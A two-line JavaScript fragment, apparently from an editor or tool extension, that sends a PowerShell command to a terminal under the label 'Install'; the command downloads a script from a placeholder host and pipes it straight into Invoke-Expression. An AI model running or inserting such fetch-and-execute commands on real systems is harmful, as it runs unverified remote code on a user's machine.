const command = "Invoke-RestMethod https://example.invalid/install.ps1 | Invoke-Expression";
api.sendCommandToTerminal(command, "Install");
